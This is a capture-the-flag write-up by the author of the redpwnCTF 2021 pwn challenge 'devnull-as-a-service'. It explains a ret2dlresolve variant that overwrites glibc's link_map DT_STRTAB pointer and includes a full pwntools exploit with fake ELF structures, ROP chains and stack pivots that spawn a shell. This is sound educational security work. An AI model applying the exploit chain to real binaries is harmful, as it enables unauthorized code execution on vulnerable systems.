---
title: redpwnCTF 2021 - devnull-as-a-service (pwn)
date: 2021-07-12
slug: /writeups/redpwnctf-2021-devnull
excerpt: ret2dlresolve on 64-bit binaries with huge pages
author: Darin Mao
---

devnull-as-a-service was a pwn challenge I wrote for redpwnCTF 2021. It had a trivial buffer overflow, but the server closed stdout and stderr, which made leaks impossible. In addition, the server was using an unknown glibc version. In this writeup, I will go through the thought process from developing this challenge.

# ret2dlresolve
ret2dlresolve is a fairly obscure technique that exploits the symbol resolution process. It was described in detail in [this paper](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf) and has since been showcased in the [2018 0ctf Qualifier](https://kileak.github.io/ctf/2018/0ctf-qual-babystack/) and the [Pwny Racing Episode 10](https://www.youtube.com/watch?v=6wmyaYP5WkA).

## Symbol Resolution
If a function needs to be resolved (i.e. the binary does not use Full RELRO and the function is being called for the first time), then the PLT will push an offset and jump into the resolver to fill in the relocation and then jump into the real function. There are several ELF structures that facilitate this process:

1. the resolver uses the offset pushed by the PLT stub to look up the function's `ElfW(Rel)`/`ElfW(Rela)` from the ELF `JMPREL` section
2. the resolver uses the `r_info` from the `ElfW(Rel)`/`ElfW(Rela)` to look up the function's `ElfW(Sym)` from the ELF `SYMTAB` section
3. the resolver uses the `st_name` from the `ElfW(Sym)` to look up the function's name from the ELF `STRTAB` section
4. the resolver uses the `r_info` from the `ElfW(Rel)`/`ElfW(Rela)` to look up the function's `vernum` from the ELF `VERSYM` section

The full process is detailed in the paper and best understood by reading the [glibc source code](https://elixir.bootlin.com/glibc/glibc-2.33.9000/source/elf/dl-runtime.c#L55), so I will not explain it in detail. Most 64-bit binaries (including the one in this challenge) use `RELA` rather than `REL`, so the relevant structs are [`Elf64_Rela`](https://elixir.bootlin.com/glibc/glibc-2.33.9000/source/elf/elf.h#L657) and [`Elf64_Sym`](https://elixir.bootlin.com/glibc/glibc-2.33.9000/source/elf/elf.h#L526):

```c
typedef struct
{
  Elf64_Addr	r_offset;		/* Address */
  Elf64_Xword	r_info;			/* Relocation type and symbol index */
  Elf64_Sxword	r_addend;		/* Addend */
} Elf64_Rela;

typedef struct
{
  Elf64_Word	st_name;		/* Symbol name (string tbl index) */
  unsigned char	st_info;		/* Symbol type and binding */
  unsigned char st_other;		/* Symbol visibility */
  Elf64_Section	st_shndx;		/* Section index */
  Elf64_Addr	st_value;		/* Symbol value */
  Elf64_Xword	st_size;		/* Symbol size */
} Elf64_Sym;
```

## Problem on 64-bit with Huge Pages
The most well-known attack that exploits symbol resolution involves creating fake structures in the writable BSS section of the binary, then calling the resolver with an out-of-bounds relocation offset. The reason this works is that there are no bounds checking on the offset pushed by the PLT stub, so we can freely reference any memory relative to the binary ELF sections. Once again, this attack is detailed in the paper so I will not explain it in detail.

The problem with this attack is that `_dl_fixup` uses the same array index for both `SYMTAB` and `VERSYM`. Each element in each of these arrays is a different size (24 and 2 bytes, respectively), so using the same index for both results in vastly different addresses for the structs. In binaries with BSS close to the other sections, this can sometimes work out. However, in 64-bit binaries that use huge pages (so BSS is very far from the other sections), this guarantees a segmentation fault when trying to index `VERSYM` if the structs are placed in BSS.

This issue is discussed in appendix A of the paper. At the end, they conclude that "this approach is not viable with small 64 bit ELF binaries that use huge pages." Unfortunately, this is what the provided binary is.

# A New Attack
Ironically, the paper itself contradicts its own conclusion that ret2dlresolve is not viable on such binaries. In section 4.3, they discuss corrupting dynamic loader data in the [`struct link_map`](https://elixir.bootlin.com/glibc/glibc-2.33.9000/source/include/link.h#L95). glibc uses this structure to describe each loaded object in memory. From reading the glibc source code, it is evident that this structure is used to find the location of all the relavent ELF sections described in the previous section. If we can corrupt this structure, then we can easily change the behavior of symbol resolution.

```c
struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */

    ElfW(Addr) l_addr;		/* Difference between the address in the ELF
				   file and the addresses in memory.  */
    char *l_name;		/* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;		/* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */

    /* All following members are internal to the dynamic linker.
       They may change without notice.  */

    /* This is an element which is only ever different from a pointer to
       the very same copy of this type for ld.so when it is used in more
       than one namespace.  */
    struct link_map *l_real;

    /* Number of the namespace this link map belongs to.  */
    Lmid_t l_ns;

    struct libname_list *l_libname;
    /* Indexed pointers to dynamic section.
       [0,DT_NUM) are indexed by the processor-independent tags.
       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.
       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are
       indexed by DT_VERSIONTAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,
	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by
       DT_EXTRATAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,
	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are
       indexed by DT_VALTAGIDX(tagvalue) and
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,
	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)
       are indexed by DT_ADDRTAGIDX(tagvalue), see <elf.h>.  */

    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];

    /* more struct members below */
```

Specifically, the symbol resolution process uses many elements from the `l_info` array to find the relevant ELF sections. As you can see from the extensive comment, the first few elements are indexed by the dynamic tag numbers.

There is an [article from 2014](https://inaz2.hatenablog.com/entry/2014/07/27/205322) that describes one possible solution to the huge page problem. They leaked the address of libc and then used it to write a NULL to `DT_VERSYM` in `link_map`. But the whole point of this technique is that it *doesn't* require a leak! If we can get a leak, then we should just use regular ret2libc. In addition, the location of the `DT_VERSYM` pointer has shifted around in recent glibc versions. I wanted to do better than this.

## Corrupting `DT_STRTAB`
The attack we'll use is even easier to do than the typical attack. The only thing we need to corrupt is the pointer to `STRTAB`. We can keep all the other ELF structures the same, but point `STRTAB` to a new string table that has the name of the function we want to call. This is described in section 4.1 of the paper. From section 4.3:

> [ret2dlresolve] can make the `DT_STRTAB` entry of the `l_info` field point to a specially-crafted dynamic entry which, in turn, points to a fake dynamic string table. Hence, the attacker can reduce the situation back to the base case presented in Section 4.1.
>
> This technique has wider applicability than the one presented in the previous section, since there are no specific constraints, and, in particular, it is **applicable also against small 64 bit ELF binaries using huge pages.**

I actually developed this attack independently before reading this section. I thought I was pretty clever, but clearly I am not the first to come up with this.

## Limitations
The first limitation is that we need to "assume the layout of
a glibc-specific structure (`link_map`) to be known." However, the fact that the server is using glibc is provided in the challenge description so it does not present any problems. As far as I can tell, the members of this structure relevant to the attack have not changed for many years.

The difficulty we must overcome is this: the only pointer (at a known address) to `link_map` is near the start of the GOT. We could probably use some ROP gadgets to dereference this address to get the address of `link_map`, then call some input function. Unfortunately, the start of the structure contains several libc addresses which we must not corrupt.

With the [glibc source](https://elixir.bootlin.com/glibc/glibc-2.33.9000/source/include/link.h#L95) and a debugger, we can investigate the `link_map` structure in more detail:

```
0x00007ffff7ffe190│+0x0000: 0x0000000000000000
0x00007ffff7ffe198│+0x0008: 0x00007ffff7ffe730  →  0x0000000000000000
0x00007ffff7ffe1a0│+0x0010: 0x0000000000600e20  →  0x0000000000000001
0x00007ffff7ffe1a8│+0x0018: 0x00007ffff7ffe740  →  0x00007ffff7fcd000  →  0x00010102464c457f
0x00007ffff7ffe1b0│+0x0020: 0x0000000000000000
0x00007ffff7ffe1b8│+0x0028: 0x00007ffff7ffe190  →  0x0000000000000000
0x00007ffff7ffe1c0│+0x0030: 0x0000000000000000
0x00007ffff7ffe1c8│+0x0038: 0x00007ffff7ffe718  →  0x00007ffff7ffe730  →  0x0000000000000000
0x00007ffff7ffe1d0│+0x0040: 0x0000000000000000
0x00007ffff7ffe1d8│+0x0048: 0x0000000000600e20  →  0x0000000000000001
0x00007ffff7ffe1e0│+0x0050: 0x0000000000600f00  →  0x0000000000000002
0x00007ffff7ffe1e8│+0x0058: 0x0000000000600ef0  →  0x0000000000000003
0x00007ffff7ffe1f0│+0x0060: 0x0000000000000000
0x00007ffff7ffe1f8│+0x0068: 0x0000000000600ea0  →  0x0000000000000005
0x00007ffff7ffe200│+0x0070: 0x0000000000600eb0  →  0x0000000000000006
0x00007ffff7ffe208│+0x0078: 0x0000000000600f30  →  0x0000000000000007
0x00007ffff7ffe210│+0x0080: 0x0000000000600f40  →  0x0000000000000008
0x00007ffff7ffe218│+0x0088: 0x0000000000600f50  →  0x0000000000000009
0x00007ffff7ffe220│+0x0090: 0x0000000000600ec0  →  0x000000000000000a
0x00007ffff7ffe228│+0x0098: 0x0000000000600ed0  →  0x000000000000000b
0x00007ffff7ffe230│+0x00a0: 0x0000000000600e30  →  0x000000000000000c
0x00007ffff7ffe238│+0x00a8: 0x0000000000600e40  →  0x000000000000000d
```

At `0x7ffff7ffe190` we see `l_addr`, which is 0 because the binary does not use PIE. Then, there are several libc addresses pointing to various things. Then, at `0x7ffff7ffe1d0`, the important `l_info` array referenced in the paper begins. Each element is a pointer to an [`Elf64_Dyn` dynamic entry](https://elixir.bootlin.com/glibc/glibc-2.33.9000/source/elf/elf.h#L838), whose first element is the `d_tag` dynamic entry type (these are the numbers 1, 2, 3, etc). The element we want to change is the `DT_STRTAB` pointer, which is tag 5 at `0x7ffff7ffe1f8`. Note how all the elements around it are addresses pointing to the binary and *not randomized* (because the binary does not use PIE). If we could somehow input data at an offset from the start of this structure, we could fill in any values we wanted while replacing the `DT_STRTAB` pointer.

Upon review, I found that you can actually just overwrite all the libc addresses with NULLs, so I guess this was easier than I thought.

# The Challenge
Now, we can investigate the challenge binary itself.

## Reversing

The `input` function at `0x400757` takes a buffer as an argument and reads `0x80` bytes from stdin into the buffer:

```c
undefined8 input(char *param_1)

{
  size_t sVar1;

  fgets(param_1,0x80,stdin);
  sVar1 = strcspn(param_1,"\n");
  param_1[sVar1] = '\0';
  return 0;
}
```

This function is used in the `fetch_data` function at `0x4007a2`, which takes a buffer as an argument and reads into the start of the buffer and at the `buffer + 0x60`:

```c
undefined8 fetch_data(char *param_1)

{
  puts("Send data:");
  input(param_1);
  puts("Customer ID:");
  input(param_1 + 0x60);
  return 0;
}
```

This is then called from `main`, using a stack buffer as the argument. However, the stack buffer is only `0x80` bytes long, while reading `0x80` bytes starting at a `0x60` offset is `0xe0` bytes! This gives us a trivial stack overflow, and the binary does not use stack canaries.

## Exploit

The critical thing to note here is the disassembly of `fetch_data`:

```nasm
0x4007a2:    push   rbp
0x4007a3:    mov    rbp,rsp
0x4007a6:    sub    rsp,0x10
0x4007aa:    mov    QWORD PTR [rbp-0x8],rdi
0x4007ae:    lea    rdi,[rip+0x266]        # 0x400a1b
0x4007b5:    call   0x400610 <puts@plt>
0x4007ba:    mov    rax,QWORD PTR [rbp-0x8]
0x4007be:    mov    rdi,rax
0x4007c1:    call   0x400757
0x4007c6:    lea    rdi,[rip+0x259]        # 0x400a26
0x4007cd:    call   0x400610 <puts@plt>
0x4007d2:    mov    rax,QWORD PTR [rbp-0x8]
0x4007d6:    add    rax,0x60
0x4007da:    mov    rdi,rax
0x4007dd:    call   0x400757
0x4007e2:    mov    eax,0x0
0x4007e7:    leave
0x4007e8:    ret
```

Notice how at `0x4007d2`, a pointer is loaded from `rbp-0x8` into `rax`, after which `0x60` is added to it. This pointer is then passed to the `input` function. This is precisely what we need—a write at an offset from a pointer. All we need to do is place the pointer to `link_map` at `rbp-0x8`. Fortunately, it is trivial to control `rbp` through the stack overflow because `rbp` is restored from the stack by `leave` before `main` returns.

## Solution
We need to put some data into BSS. For no particular reason, I chose to place my fake `Elf64_Dyn` at `exe.bss() + 0x100`. For the sake of clarity, I used `Elf64_Dyn` and `_U__Elf64_Dyn` from `pwnlib.elf.datatypes`, but you could totally just use `p64` or something similar to build this manually.

```py
def pack(start, structs, padchr=b'A'):
  '''
  packs structs starting at an address, padding as needed
  '''
  data = b''
  for addr, struct in structs:
    current = start+len(data)
    if addr < current:
      raise ValueError('Overlapping structs')
    data += padchr*(addr-current)
    data += bytes(struct)
  return data

structs = []
structs_base = exe.bss()+0x100

# offset to fgets (we'll be replacing it with system)
strtab_offset = exe.section('.dynstr').index(b'fgets\x00')

# Elf64_Dyn
dynamic_entry = Elf64_Dyn(d_tag=elf_const.DT_STRTAB)
structs.append((structs_base, dynamic_entry))

# strings
system_addr = structs_base + sizeof(Elf64_Dyn)
system = b'system\x00'
structs.append((system_addr, system))
sh_addr = system_addr + len(system)
sh = b'/bin/sh > /tmp/stdout\x00'
structs.append((sh_addr, sh))

# link them together
dynamic_union = _U__Elf64_Dyn()
dynamic_union.d_ptr = system_addr - strtab_offset
dynamic_entry.d_un = dynamic_union
```

We also need to figure out what to write to the `link_map`. Since our input starts at `link_map+0x60` and we want to overwrite the pointer at `link_map+0x68`, all we have to do is copy some values.

```python
link_map =  p64(0)              # DT_HASH
link_map += p64(structs_base)   # DT_STRTAB
link_map += p64(0x600eb0)       # DT_SYMTAB
```

Overwriting `DT_SYMTAB` is not relevant to the attack, but since `fgets` needs a newline to stop and we can't corrupt this value we'll overwrite it to stay the same so the newline goes into the next pointer (which doesn't crash the program when corrupted).

Now that we've prepared all the relevant structures, we can start the actual exploit. Since the input size is rather limited, I did a few stack pivots.

```python
# ROP chain #1
# set rbp, input structs, input ROP chain #2, return to fetch_data
log.info('ROP #1')
payload =  b'A'*32
payload += p64(0x601010)            # put rbp here, right after link_map
payload += p64(pop_rdi)
payload += p64(structs_base)        # input structs
payload += p64(func_input)
payload += p64(pop_rdi)
payload += p64(0x601018)            # input ROP chain #2
payload += p64(func_input)
payload += p64(pop_rdi)
payload += p64(exe.bss() + 0x800)   # input ROP chain #3
payload += p64(func_input)
payload += p64(func_fetch+48)       # overwrite link_map
# we're jumping to the middle here
# 1) overwrite link_map+64
# 2) leave; ret at the end
r.sendlineafter('data:\n', 'a')
r.sendlineafter('ID:\n', payload)
```

This first payload sets `rbp` to `0x601010`, calls `input` to read all our structures into the right place, then inputs two more ROP chains before jumping to the middle of `fetch_data` as described in the previous section.

```python
log.info('Sending structs')
r.sendline(pack(structs_base, structs))
```

We send all our structures.

```python
pivot = rop.find_gadget(['pop rsp', 'pop r13', 'pop r14', 'pop r15', 'ret']).address
log.info('ROP #2')
payload =  p64(pivot)
payload += p64(exe.bss() + 0x800 - 3*8)
r.sendline(payload)
```

We pivot into ROP #3. I did not want to do a long ROP chain here because we are in the GOT and it would probably mess up some pointers.

```python
log.info('ROP #3')
payload =  p64(pop_rdi)
payload += p64(sh_addr)
payload += p64(exe.symbols['fgets']+6)
r.sendline(payload)
```

We set `rdi` to the `/bin/sh > /tmp/stdout` string, then call `fgets+6`, which bypasses the GOT and calls the resolver for `fgets`, which will actually resolve to `system` now.

```python
log.info('Overwriting link_map')
r.sendline(link_map)
```

We overwrite `link_map`. Now, everything is set in place. The stack pivots around a few times before calling `fgets("/bin/sh > /tmp/stdout")`, which produces a shell.

# Additional Thoughts
Several competitors I talked to solved this challenge by using the well-known `add dword ptr [rbp - 0x3d], ebx` gadget to change the `close` GOT pointer to `syscall`. This was actually considered during review long before the CTF, so all the I/O functions were replaced with stdio functions. Unfortunately, at some point after that `close` and `_exit` were reintroduced, and this did not get caught a second time. Moreover, even with stdio functions and a large POW, the CTF was long enough that competitors could probably use some educated guessing to find the offset to `syscall` from a function. I briefly considered releasing a second version of this challenge, but this was the main reason why I decided against it.

Another competitor I talked to used ret2dlresolve, but they mentioned some issues with `vernum`, so I suspect they tried to write a NULL there. The location of this pointer has shifted around, but there were only two offsets to try so the large POW did not present any issues.

This was certainly an unusual technique and it took some thought to make it viable. I think using a structure as a buffer was *just* subtle enough so that it didn't seem too suspicious or contrived. In the end, this wasn't even necessary as the libc addresses did not need to be kept intact. I doubt this technique would ever be viable in normal situations, but it was definitely interesting to learn about and investigate.
